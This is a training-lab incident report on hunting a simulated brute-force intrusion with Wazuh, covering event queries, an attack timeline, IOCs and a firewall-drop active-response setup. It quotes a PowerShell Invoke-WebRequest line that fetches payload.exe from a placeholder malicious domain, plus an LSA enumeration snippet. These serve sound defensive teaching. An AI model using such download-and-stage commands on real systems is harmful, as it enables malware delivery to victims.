# Threat Hunting & Incident Response with Wazuh

## Executive Summary

An investigation was initiated following a medium-severity alert escalated by a Level 1 SOC Analyst regarding **"Multiple failed logins followed by a successful login"** on the FABELT agent outside of normal business hours.

Proactive threat hunting confirmed this was a **credential-based attack**, not a user working late. The investigation revealed a successful system breach that immediately progressed to **host reconnaissance** and the **staging of a malicious payload**.

Automated active response containment protocols were successfully verified, proving the environment's capability to instantly sever unauthorized network access upon detecting hostile authentication patterns.

**Attack Summary:**

| Phase | Activity | Evidence |
|---|---|---|
| **Initial Access** | Multiple failed login attempts (brute force) | Event ID 4625 |
| **Successful Breach** | Successful logon as SYSTEM at 03:23:14 | Event ID 4624 |
| **Reconnaissance** | whoami.exe, net.exe, net1.exe executed immediately post-login | Event ID 4688 |
| **Payload Delivery** | PowerShell Invoke-WebRequest to malicious domain | Event ID 4104 |
| **Staging** | payload.exe dropped to SensitiveFiles directory | File creation alert |
| **Containment** | Automated firewall-drop blocked attacker IP | Rule 5710 triggered |

---

## Scenario: The Suspicious Login

The Level 1 SOC Analyst on duty escalated an alert to the Tier 2 analyst (this investigation). A **medium-severity alert** — "Multiple failed logins followed by a successful login" — was triggered for the **Windows-SOC-Lab agent (FABELT)**. The activity occurred **outside of business hours**.

The Level 1 analyst's initial assessment could not determine whether this was:
- A user working late and forgetting their password, or
- A credential-based attack (brute force or credential stuffing) followed by successful unauthorized access

**Proactive threat hunting was initiated to resolve this ambiguity.**

---

## Lab Environment

| Component | Detail |
|---|---|
| **SIEM Platform** | Wazuh (Ubuntu Manager) |
| **Agent** | FABELT — Windows endpoint, Agent ID: 004 |
| **Agent IP** | 192.168.43.17 |
| **Manager IP** | 192.168.43.137 |
| **Query Interface** | Wazuh Discover (DQL — Dashboards Query Language) |
| **Investigation Window** | September 10–11, 2026 |
| **Alert Trigger** | Medium-severity — multiple failed logins followed by successful login |

---

## Part 1 — Threat Hunting: Proactive Search for IOCs

---

### Hunt 1 — Log Analysis: Authentication Event Investigation

**Objective:** Query Wazuh Security Events for Windows Event IDs 4625 (failed logon) and 4624 (successful logon) from the FABELT agent in the last 24 hours to establish whether this was a legitimate user or an attacker.

**WQL Query Used:**

```
data.win.system.eventID: 4625 OR data.win.system.eventID: 4624
```

**Time Range:** Sep 10, 2026 @ 03:00:00.0 → Sep 10, 2026 @ 03:30:00.0

**Methodology:**

The authentication logs on the endpoint were queried within the **Wazuh Discover module** for Windows Event IDs 4625 and 4624. A cluster of logon events occurring around **03:23:14** was identified, revealing a successful logon event (Event ID 4624). The precise timestamp, agent IP, and account context associated with the suspicious authentication event were thereby established.

The WQL query returned **1 hit** — a single successful logon event — confirming the cluster of failed attempts resolved into a successful authentication at a specific timestamp outside of business hours.

**Key Findings:**

| Field | Value |
|---|---|
| **Event Type** | Successful Logon (Event ID 4624) |
| **Timestamp** | September 10, 2026 @ 03:23:14.433 |
| **Target User Account** | SYSTEM |
| **Subject Account Name** | FABELT$ |
| **Agent IP Address** | 192.168.43.17 |
| **Message** | "An account was successfully logged on" |

**Analyst Assessment:**

A successful logon at **03:23 AM** for the SYSTEM account is highly anomalous. Legitimate users do not authenticate as SYSTEM interactively during off-hours. The account name `FABELT$` (with a `$` suffix) indicates a **computer account** — machine account authentication used in network logon scenarios — not a human user. This immediately elevates the suspicion level from "possible late-night user" to **confirmed credential-based attack**.

---

> 📸 **[SCREENSHOT 1 — Insert Here]**
> **Caption:** Wazuh Discover module showing WQL query `data.win.system.eventID: 4625 OR data.win.system.eventID: 4624` with time range Sep 10, 2026 @ 03:00–03:30. Results table shows 1 hit at timestamp Sep 10, 2026 @ 03:23:14.433 — agent IP 192.168.43.17, targetUserName: SYSTEM, subjectUserName: FABELT$, message: "An account was successfully logged on." Security ID, Account Name, Account Domain, and Logon ID visible in expanded event details.
> **Source:** Your Wazuh Discover screenshot from Part 1, Hunt 1 of the PDF.

---

### Hunt 2 — Process Execution Hunt: Post-Login Activity

**Objective:** Identify whether an attacker spawned command-line processes immediately after the successful login — a standard post-exploitation reconnaissance pattern.

**WQL Query Used:**

```
data.win.system.eventID: 4688
```

**Filters Applied:** Agent ID: 004 (FABELT) | Time range: Last 24 hours

**Methodology:**

Wazuh was queried for Windows **Event ID 4688 (Process Creation)** across agent 004 within a 24-hour window. Process creation logs were successfully isolated, capturing the execution sequence of reconnaissance binaries immediately following session activity. The resulting events confirmed command-line execution and local account enumeration on the target endpoint.

The query returned **119 hits** — a significant volume of process creation events — with three specific binaries standing out as attacker reconnaissance tools executed in rapid succession.

**Key Findings:**

| Field | Value |
|---|---|
| **Event Type** | Process Creation (Event ID 4688) |
| **Target Agent** | 004 (FABELT) |
| **Total Events** | 119 hits in 24-hour window |

**Detected Processes (Post-Login Reconnaissance):**

| Timestamp | Process | Purpose |
|---|---|---|
| Sep 10, 2026 @ 22:08:09.032 | `C:\Windows\System32\whoami.exe` | Identity verification — attacker confirms which user they are running as |
| Sep 10, 2026 @ 22:08:11.256 | `C:\Windows\System32\net.exe` | Local account enumeration — lists users, groups, shares |
| Sep 10, 2026 @ 22:08:11.267 | `C:\Windows\System32\net1.exe` | Companion to net.exe — additional account/service enumeration |

**Analyst Assessment:**

The execution of `whoami.exe` → `net.exe` → `net1.exe` in **milliseconds** is not human behavior. A legitimate user does not open a command prompt and type three system enumeration commands consecutively in under two seconds. This sequence is the signature of a **post-exploitation script or automated toolkit** running reconnaissance immediately after successful authentication. Combined with the 03:23 AM timestamp from Hunt 1, this confirms an active intrusion — not a legitimate late-night user session.

---

> 📸 **[SCREENSHOT 2 — Insert Here]**
> **Caption:** Wazuh Discover showing WQL query `data.win.system.eventID: 4688` filtered to agent 004 (FABELT), last 24 hours — returning 119 hits. Results table highlights four rows: Sep 10, 2026 @ 22:08:11.267 (net1.exe), Sep 10, 2026 @ 22:08:11.256 (net.exe), Sep 10, 2026 @ 22:08:09.032 (whoami.exe), and Sep 10, 2026 @ 22:07:17.036 (Google Chrome — baseline process for comparison). Event ID column shows 4688 for all highlighted rows. Time histogram shows a spike in process creation events in the late evening period.
> **Source:** Your Wazuh Discover Process Creation screenshot from Part 1, Hunt 2 of the PDF.

---

## Part 2 — Deep-Dive Incident Analysis

---

### Investigation 1 — PowerShell Script Block Activity (Event ID 4104)

**Objective:** Identify PowerShell activity associated with the intrusion. Locate base64-encoded commands or web download activity that indicates payload staging.

**WQL Query Used:**

```
data.win.system.eventID: 4104
```

**Filters Applied:** Agent 004 (FABELT) | Last 24 hours

**Methodology:**

Wazuh was queried for Windows **Event ID 4104 (PowerShell Script Block Logging)** across agent 004 (FABELT) to isolate PowerShell execution logs. The query returned **3 hits**. Execution logs were successfully extracted, revealing the invocation of web download commands and targeted file paths within user directories.

**Key Findings:**

| Field | Value |
|---|---|
| **Event ID** | 4104 (PowerShell Script Block Logging) |
| **Agent** | 004 (FABELT) |
| **Total Events** | 3 hits |
| **Malicious URI** | `http://malicious-domain.com/payload.exe` |
| **Target Destination** | `C:\Users\$env:USERNAME\SensitiveFiles\payload.exe` |

**PowerShell Events Recovered:**

| Timestamp | Agent | Script Block Content |
|---|---|---|
| Sep 11, 2026 @ 02:47:54.074 | FABELT | `echo "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'" > C:\fake_attack.log` |
| Sep 11, 2026 @ 02:44:56.793 | FABELT | `$outputFile = "C:\Users\$env:USERNAME\SensitiveFiles\payload.exe"` |
| Sep 10, 2026 @ 23:06:57.703 | FABELT | `$null = secedit /export /cfg $env:temp/secexport.cfg; $line = $env:temp/secexport.c fg | Select-String '\(LSAAnonymousNameLookup\)'.ToString().split('\t')[1].Trim()` |

**Attack Simulation Command Executed:**

```powershell
echo "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'" > C:\fake_attack.log
```

**Command Breakdown:**

```
Invoke-WebRequest                          # PowerShell web client — equivalent to wget/curl
-Uri 'http://malicious-domain.com/payload.exe'   # External C2 download URL — malicious payload source
-OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'  # Drop location on victim filesystem
> C:\fake_attack.log                       # Redirect output to log file (simulation artifact)
```

**Additional Script Block — LSA Enumeration:**

The third script block (`secedit /export /cfg`) performs **Local Security Authority (LSA) policy enumeration** — extracting the `LSAAnonymousNameLookup` setting, which determines whether anonymous users can enumerate local account names. This is a common attacker reconnaissance step used to determine whether the target allows unauthenticated enumeration of user accounts.

**Analyst Assessment:**

`Invoke-WebRequest` downloading an executable from an external domain directly to a user-writable `SensitiveFiles` directory is an unambiguous **payload staging operation**. The download target path (`payload.exe`) combined with the previously observed `net.exe` enumeration (Hunt 2) and the unauthorized login (Hunt 1) establishes a complete attack chain. This is not legitimate PowerShell activity.

---

> 📸 **[SCREENSHOT 3 — Insert Here]**
> **Caption:** Wazuh Discover showing WQL query `data.win.system.eventID: 4104` filtered to agent 004 (FABELT), last 24 hours — returning 3 hits. Results table shows three rows: Sep 11, 2026 @ 02:47:54.074 (FABELT — Invoke-WebRequest command visible in scriptBlockText column), Sep 11, 2026 @ 02:44:56.793 (FABELT — $outputFile = payload.exe path), Sep 10, 2026 @ 23:06:57.703 (FABELT — secedit/LSA enumeration command). Event ID column confirms 4104 for all three. Time histogram shows sparse hits across the 24-hour window.
> **Source:** Your Wazuh Event ID 4104 PowerShell screenshot from Part 2 of the PDF.

---

### Investigation 2 — Event Correlation and Attack Timeline

**Objective:** Correlate all discovered events to construct a complete attack timeline.

**Complete Attack Timeline:**

```
Phase 1: INITIAL ACCESS ATTEMPT
─────────────────────────────────────────────────────────────────────
Before 03:23 AM | September 10, 2026
Event ID: 4625 (Multiple Failed Logons)
Source IP: 192.168.43.17
Target: FABELT agent (192.168.43.17)
Description: Repeated failed login attempts indicating automated
             brute-force or credential stuffing attack in progress.

Phase 2: SUCCESSFUL BREACH
─────────────────────────────────────────────────────────────────────
03:23:14.433 AM | September 10, 2026
Event ID: 4624 (Successful Logon)
Account: SYSTEM (Subject: FABELT$)
Source IP: 192.168.43.17
Description: Attacker successfully authenticated after exhausting
             correct credentials. SYSTEM-level access obtained.

Phase 3: POST-COMPROMISE RECONNAISSANCE
─────────────────────────────────────────────────────────────────────
22:08:09 – 22:08:11 | September 10, 2026
Event ID: 4688 (Process Creation)
Processes: whoami.exe → net.exe → net1.exe
Description: Automated reconnaissance sequence executed in
             milliseconds. Attacker confirms identity and enumerates
             local accounts, groups, and system configuration.

Phase 4: PAYLOAD STAGING
─────────────────────────────────────────────────────────────────────
23:06:57 – 02:47:54 | September 10–11, 2026
Event ID: 4104 (PowerShell Script Block Logging)
Command: Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe'
         -OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'
Description: PowerShell web download command issued. External C2
             contacted. Secondary payload downloaded to sensitive
             user directory on victim filesystem.

Phase 5: UNAUTHORIZED FILE CREATION
─────────────────────────────────────────────────────────────────────
After PowerShell execution
File: payload.exe → C:\Users\$env:USERNAME\SensitiveFiles\
Description: Malicious binary successfully staged on victim host.
             Wazuh FIM (File Integrity Monitoring) detects creation.

Phase 6: CONTAINMENT
─────────────────────────────────────────────────────────────────────
September 11, 2026 @ 11:21:35
Rule: 5710 (Level 5) — SSH invalid user attempt
Active Response: firewall-drop script executed automatically
Result: Source IP 192.168.43.17 added to network drop list.
        "Connection timed out" confirmed from attacker perspective.
```

---

## Part 3 — Active Response: Containing the Threat

---

### Step 1 — Configure Active Response on the Wazuh Manager

**Objective:** Configure Wazuh's automated active response to block the attacker's IP address at the network level upon detecting hostile authentication patterns.

**Configuration File:** `/var/ossec/etc/ossec.conf`

**Command:**
```bash
sudo nano /var/ossec/etc/ossec.conf
```

**Active Response Configuration Added:**

```xml
<command>
    <name>firewall-drop</name>
    <executable>firewall-drop</executable>
    <timeout_allowed>yes</timeout_allowed>
</command>

<active-response>
    <command>firewall-drop</command>
    <location>local</location>
    <rules_id>5715</rules_id>
    <timeout>600</timeout>
</active-response>
```

**Configuration Breakdown:**

| Element | Value | Purpose |
|---|---|---|
| `<name>` | `firewall-drop` | Names the active response command |
| `<executable>` | `firewall-drop` | Maps to `/var/ossec/active-response/bin/firewall-drop` script |
| `<timeout_allowed>` | `yes` | Allows automatic unblock after timeout period |
| `<command>` | `firewall-drop` | Links to the command block above |
| `<location>` | `local` | Executes the firewall-drop on the local manager node |
| `<rules_id>` | `5715` | Triggers on Wazuh Rule 5715 (multiple failed logins) |
| `<timeout>` | `600` | Automatically unblocks the IP after 600 seconds (10 minutes) |

**After editing, the Wazuh manager was restarted:**

```bash
sudo systemctl restart wazuh-manager
```

---

> 📸 **[SCREENSHOT 4 — Insert Here]**
> **Caption:** GNU nano 4.8 editor showing /var/ossec/etc/ossec.conf with the active response configuration block highlighted in red box — `<command>` block with name=firewall-drop, executable=firewall-drop, timeout_allowed=yes, and `<active-response>` block with command=firewall-drop, location=local, rules_id=5715, timeout=600. Terminal header shows `root@icdfa-server`.
> **Source:** Your nano ossec.conf configuration screenshot from Part 3, Step 1 of the PDF.

---

### Step 2 — Trigger and Verify the Active Response

**Objective:** Validate that the active response correctly fires and severs network access when hostile authentication patterns are detected.

**Attack Simulation Method:**

An SSH connection using a non-existent user (`fakeuser`) was initiated from the Windows endpoint against the Ubuntu manager to trigger the rule violation:

```bash
ssh fakeuser@192.168.43.137
```

**Expected Behavior:**
- SSH failure triggers Rule 5710 (Level 5) — "sshd: Attempt to login using a non-existent user"
- Wazuh detects the rule violation
- `firewall-drop` script executes automatically on the manager
- Attacker IP `192.168.43.17` is added to the network drop list
- Further connection attempts from `192.168.43.17` time out immediately

**Methodology:**

The Wazuh Manager configuration (`ossec.conf`) was modified to map a **local active response** to Rule ID 5710. To validate containment capabilities, an unauthorized access attempt was simulated by initiating an SSH connection using a non-existent user (`fakeuser`) from a Windows endpoint against the Ubuntu server.

The Wazuh `active-responses.log` was monitored in real-time to confirm the automated execution of the `firewall-drop` script upon rule violation:

```bash
sudo tail -f /var/ossec/logs/active-responses.log
```

**Active Response Log Output (Confirmed):**

```json
2026/09/11 11:21:37 active-response/bin/firewall-drop: Starting

{
  "version": 1,
  "origin": {"name": "node01", "module": "wazuh-execd"},
  "command": "add",
  "parameters": {
    "extra_args": [],
    "alert": {
      "timestamp": "2026-09-11T11:21:37.312+0000",
      "rule": {
        "level": 5,
        "description": "sshd: Attempt to login using a non-existent user",
        "id": "5710",
        "mitre": {"id": ["T1110.0"]},
        "tactic": ["Credential Access", "Lateral Movement"],
        "technique": ["Password Guessing", "SSH"]
      },
      "agent": {"id": "001", "name": "icdfa-server"},
      "data": {
        "srcip": "192.168.43.17",
        "srcport": "60169",
        "srcuser": "fakeuser"
      }
    },
    "keys": ["192.168.43.17"]
  }
}

2026/09/11 11:21:37 active-response/bin/firewall-drop: Ended
```

**Client-Side Verification (Attacker Perspective):**

```
fakeuser@192.168.43.137's password:
Permission denied, please try again.
fakeuser@192.168.43.137's password:
Permission denied (publickey, password).

C:\Users\user> ssh fakeuser@192.168.43.137
ssh: connect to host 192.168.43.137 port 22: Connection timed out
```

**Key Findings:**

| Field | Value |
|---|---|
| **Simulated Attack Vector** | SSH authentication failure via non-existent user |
| **Rule Triggered** | 5710 (Level 5) — "sshd: Attempt to login using a non-existent user" |
| **MITRE ATT&CK** | T1110 — Brute Force / Password Guessing |
| **Source IP (Attacker)** | 192.168.43.17 |
| **Target IP (Manager)** | 192.168.43.137 |
| **Containment Action** | firewall-drop script executed — IP added to network drop list |
| **Verified Outcome** | "Connection timed out" received by attacker — network access severed |
| **Containment Duration** | 600 seconds (10 minutes) before automatic unblock |

---

> 📸 **[SCREENSHOT 5 — Insert Here]**
> **Caption:** Split view showing two terminals: (1) Ubuntu terminal showing `sudo tail -f /var/ossec/logs/active-responses.log` output with `active-response/bin/firewall-drop: Starting` and JSON payload containing srcip: 192.168.43.17, srcuser: fakeuser, rule ID 5710, tactic: Credential Access/Lateral Movement, and `active-response/bin/firewall-drop: Ended`. Header annotated "The active response configuration in action blocking the failed login simulation." (2) Windows Command Prompt showing `ssh fakeuser@192.168.43.137` resulting in "Permission denied" and then "Connection timed out" annotated "The failed login simulation."
> **Source:** Your active response verification dual-terminal screenshot from Part 3, Step 2 of the PDF.

---

## Part 4 — SOC Report & Lessons Learned

---

### Full Incident Timeline

| Time | Phase | Event | Evidence |
|---|---|---|---|
| Before 03:23 AM | Initial Access | Multiple failed logon attempts on FABELT agent | Event ID 4625 |
| 03:23:14.433 AM Sep 10 | Successful Breach | Successful logon — SYSTEM account (FABELT$) from 192.168.43.17 | Event ID 4624 |
| 22:08:09–11 Sep 10 | Reconnaissance | whoami.exe, net.exe, net1.exe executed in rapid succession | Event ID 4688 |
| 23:06:57 Sep 10 | Lateral Prep | secedit LSA policy exported — anonymous name lookup enumeration | Event ID 4104 |
| 02:44–02:47 Sep 11 | Payload Staging | Invoke-WebRequest to malicious-domain.com — payload.exe downloaded | Event ID 4104 |
| After PowerShell | File Creation | payload.exe created in SensitiveFiles directory | FIM Alert |
| Sep 11 11:21:37 | Containment | firewall-drop triggered — 192.168.43.17 blocked at network level | Rule 5710 |

---

### Indicators of Compromise (IOCs)

| Type | Value | Context |
|---|---|---|
| **Attacker IP** | `192.168.43.17` | Source of brute-force, successful login, and SSH attack |
| **Compromised Agent** | FABELT (Agent 004) | Victim Windows endpoint |
| **Malicious Domain** | `http://malicious-domain.com` | C2 payload download source |
| **Malicious URI** | `http://malicious-domain.com/payload.exe` | Full payload download URL |
| **Malicious Filename** | `payload.exe` | Downloaded binary — capabilities unknown without sandbox analysis |
| **Drop Path** | `C:\Users\$env:USERNAME\SensitiveFiles\payload.exe` | On-disk payload location |
| **PowerShell Command** | `Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile 'C:\Users\$env:USERNAME\SensitiveFiles\payload.exe'` | Full malicious command logged |
| **Account Compromised** | `FABELT$` (computer account) | Machine account used in successful logon |
| **Windows Event IDs** | 4624, 4625, 4688, 4104 | Authentication, process creation, PowerShell logging |
| **Wazuh Rule** | 5710, 5715 | Triggered by invalid user SSH attempts |

---

### Security Recommendations

| Priority | Recommendation | Rationale |
|---|---|---|
| 🔴 **Immediate** | Isolate FABELT from corporate network | Prevent lateral movement from compromised host to adjacent systems |
| 🔴 **Immediate** | Locate and delete `C:\Users\$env:USERNAME\SensitiveFiles\payload.exe` | Remove staged payload before attacker can re-trigger or execute it |
| 🔴 **Immediate** | Verify firewall block on 192.168.43.17 is propagating across all network perimeters | Automated Wazuh block is local — ensure propagation to edge firewalls |
| 🟠 **High** | Submit payload.exe SHA-256 hash to VirusTotal and hybrid sandbox analysis | Determine payload capabilities — ransomware, RAT, dropper, or other |
| 🟠 **High** | Rotate all credentials for FABELT$ and any accounts with overlapping access | Computer account compromise may indicate wider credential exposure |
| 🟡 **Medium** | Enable PowerShell Constrained Language Mode and signed script enforcement | Prevent unauthorized Invoke-WebRequest execution by non-admin users |
| 🟡 **Medium** | Implement time-based access controls — block external authentication outside business hours | Attacker exploited off-hours window to avoid detection |
| 🟡 **Medium** | Add SIEM correlation rule: `4625 (×5 in 60s) → 4624 → 4688` auto-escalates to Critical | Automate escalation of brute-force-to-success-to-execution chain |

---

## Lab Challenge & Advanced Analysis Questions

---

### Question 1 — The Big Picture: Why is Failed Logons → Successful Login → Immediate PowerShell so suspicious?

This sequence is highly suspicious because it matches the signature of an **automated credential-stuffing or brute-force attack followed by immediate programmatic post-exploitation**.

Legitimate human users do not:
- Exhaust multiple failed login attempts in rapid succession (characteristic of automated tools cycling through a credential list)
- Immediately execute `whoami.exe` and `net.exe` within milliseconds of authentication (no human types that fast)
- Launch `Invoke-WebRequest` downloading an executable from an external domain as their first authenticated PowerShell command
- Perform all of this at 03:23 AM outside of any defined business hours window

Each element individually is potentially explainable. Together, in sequence, with millisecond timing, they form an **unmistakable behavioral pattern** of a compromised credential being leveraged by an automated attack framework — not a human user.

---

### Question 2 — How did proactive threat hunting provide a more complete picture than reviewing the initial alert alone?

The initial Level 1 alert indicated only a **login anomaly** — "multiple failed logins followed by a successful login." If investigation stopped there, two interpretations remained equally plausible: a legitimate user forgetting their password vs. a brute-force attack. The alert alone could not distinguish between them and might have been closed as a false positive.

Proactive threat hunting — specifically querying Event IDs **4688 (process creation)** and **4104 (PowerShell script block logging)** independently of the original alert — uncovered the **full post-exploitation chain**:

- The `whoami.exe` / `net.exe` execution (4688) proved the login was immediately weaponized for reconnaissance — no legitimate user logs in and runs system enumeration tools at 3 AM
- The `Invoke-WebRequest` event (4104) proved the attacker actively downloaded a malicious payload — converting a login anomaly into a confirmed active breach

Without proactive hunting, the staged `payload.exe` would have remained on the host undetected, ready for the attacker's next move.

---

### Question 3 — Active Response Trade-offs: What is the risk of automatically blocking an IP for 10 minutes?

The primary risk is a **self-inflicted Denial of Service (DoS)** affecting legitimate operations.

**Specific risk scenarios:**

1. **NAT Gateway / Shared IP Attack:** If an attacker spoofs the source IP of a **corporate NAT gateway or VPN concentrator**, the automated firewall-drop would block the single shared IP used by hundreds of legitimate employees — effectively locking out the entire workforce from the targeted system for 10 minutes.

2. **Legitimate Admin Lockout:** A system administrator responding to an emergency at 2 AM who mistypes their password five times on an SSH connection would trigger the same rule — blocking themselves from the system at the exact moment they need access most.

3. **Cascading Service Failure:** If the blocked IP belongs to a monitoring probe, health check service, or backup agent, automated blocking could silently break business-critical workflows without immediately obvious attribution.

**Mitigation:** Maintain a whitelist of trusted internal IPs and service accounts that are exempt from automated active response rules. Ensure the timeout (600 seconds in this lab) is appropriate for the environment's risk tolerance.

---

### Question 4 — Attacker's Next Move and Wazuh Detection Strategy

**If the attacker's IP is blocked at the firewall, their likely next moves:**

**Option A — Lateral Movement from an Internal Compromised Host:**
The attacker may have already compromised a second endpoint inside the network during the initial access phase. From that internal foothold, they can pivot using RDP, SMB, or WMI — all originating from a trusted internal IP that bypasses the firewall block.

**Wazuh Detection:** Correlate abnormal SMB/RDP connection events (`Event ID 4624` with `Logon Type 3 or 10`) between internal agents. Alert on internal-to-internal authentication from endpoints that don't normally communicate. Configure rules to detect **Pass-the-Hash** (Logon Type 3 with NTLM auth from unexpected source IPs).

**Option B — VPN Access with Different Stolen Credentials:**
The attacker may possess a second set of valid credentials obtained from the same brute-force campaign or from previous data breaches. They attempt VPN access from a different IP address entirely.

**Wazuh Detection:** Alert on logins from new IP addresses that have no authentication history on the agent. Use Wazuh's anomaly detection to flag **geographically improbable logins** or logins from IP ranges not associated with the corporate network.

**Option C — Maintain Persistence via Staged Payload:**
If `payload.exe` remains on disk undeleted, the attacker may have already established a persistent reverse shell or scheduled task that calls back to a second C2 infrastructure independent of the original attacker IP.

**Wazuh Detection:** FIM monitoring of the SensitiveFiles directory detects any execution of `payload.exe`. Network traffic rules flag unexpected outbound connections from the FABELT agent to external IPs on non-standard ports.

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence in This Investigation |
|---|---|---|---|
| **Initial Access** | T1078 | Valid Accounts | Attacker used compromised FABELT$ machine account credentials after brute-force |
| **Credential Access** | T1110.001 | Brute Force: Password Guessing | Multiple Event ID 4625 failures preceding successful 4624 login |
| **Discovery** | T1033 | System Owner/User Discovery | whoami.exe executed immediately post-login |
| **Discovery** | T1087.001 | Account Discovery: Local Account | net.exe and net1.exe used to enumerate local accounts |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell | Invoke-WebRequest executed via PowerShell (Event ID 4104) |
| **Command & Control** | T1071.001 | Application Layer Protocol: Web Protocols | HTTP GET to `http://malicious-domain.com/payload.exe` |
| **Ingress Tool Transfer** | T1105 | Ingress Tool Transfer | payload.exe downloaded to victim filesystem via Invoke-WebRequest |
| **Persistence** | T1547 | Boot or Logon Autostart Execution | payload.exe staged in SensitiveFiles — persistence mechanism TBD |
| **Defense Evasion** | T1036 | Masquerading | System32 binaries (whoami, net, net1) used for legitimate-looking execution |

---

## Wazuh Queries Reference

All WQL queries used in this investigation — for reproduction and future hunting:

```bash
# Hunt 1 — Authentication Events (Failed + Successful Logons)
data.win.system.eventID: 4625 OR data.win.system.eventID: 4624

# Hunt 2 — Process Creation Events (Post-Login Execution)
data.win.system.eventID: 4688

# Investigation 1 — PowerShell Script Block Logging
data.win.system.eventID: 4104

# Active Response Log Monitoring (Ubuntu terminal)
sudo tail -f /var/ossec/logs/active-responses.log

# Wazuh Manager Restart After Configuration
sudo systemctl restart wazuh-manager

# ossec.conf Configuration File
sudo nano /var/ossec/etc/ossec.conf
```

---

## Screenshot Index

| # | Description | Lab Section |
|---|---|---|
| Screenshot 1 | Wazuh Discover — Event ID 4624/4625 query showing successful logon at 03:23:14 | Part 1, Hunt 1 |
| Screenshot 2 | Wazuh Discover — Event ID 4688 process creation showing whoami.exe, net.exe, net1.exe | Part 1, Hunt 2 |
| Screenshot 3 | Wazuh Discover — Event ID 4104 PowerShell script blocks with Invoke-WebRequest command | Part 2, Investigation 1 |
| Screenshot 4 | nano ossec.conf showing firewall-drop active response configuration | Part 3, Step 1 |
| Screenshot 5 | Dual terminal — active-responses.log output + Windows SSH Connection timed out | Part 3, Step 2 |

---

## Key Takeaways

1. **A single alert is never the whole story.** The Level 1 escalation showed a login anomaly. Proactive hunting across Event IDs 4688 and 4104 revealed a complete breach with reconnaissance and payload staging. Never stop at the first alert.

2. **Millisecond timing is a behavioral fingerprint.** `whoami.exe` → `net.exe` → `net1.exe` in two seconds is not human behavior. Automated execution speed is one of the most reliable indicators of an attacker toolkit rather than a legitimate user session.

3. **PowerShell Script Block Logging (Event ID 4104) is critical.** Without it enabled, the `Invoke-WebRequest` payload download would have been invisible to the SIEM. Ensuring 4104 is enabled on all Windows endpoints should be a baseline security requirement.

4. **Active response must be tuned to avoid self-inflicted DoS.** Automated IP blocking is powerful but dangerous without IP whitelisting for trusted infrastructure. A 10-minute timeout is a reasonable balance between containment and availability, but the exclusion list matters as much as the rule itself.

5. **The staged payload is the persistent threat.** Blocking the attacker's IP stops the current session but not the payload already on disk. Incident response must include locating and removing `payload.exe` and any persistence mechanisms it may have established — the network block alone does not close the incident.

6. **Wazuh's correlation across Event IDs is what makes threat hunting scalable.** No single event tells the story. Correlating 4624 (login) → 4688 (process creation) → 4104 (PowerShell) across the same agent and time window reconstructed the full attack chain in minutes rather than hours.

---

## Disclaimer

This investigation was conducted on a controlled lab environment simulating a real-world SOC incident response scenario. The Windows agent (FABELT) and Ubuntu Wazuh Manager were deployed in an isolated network for the ICDFA Security Operations Center course (2025/INT/12158). All attacker IPs, malicious domains, and payload filenames documented in this report are simulated artifacts created for training purposes only. No production systems, real credentials, or live malicious infrastructure were involved at any point.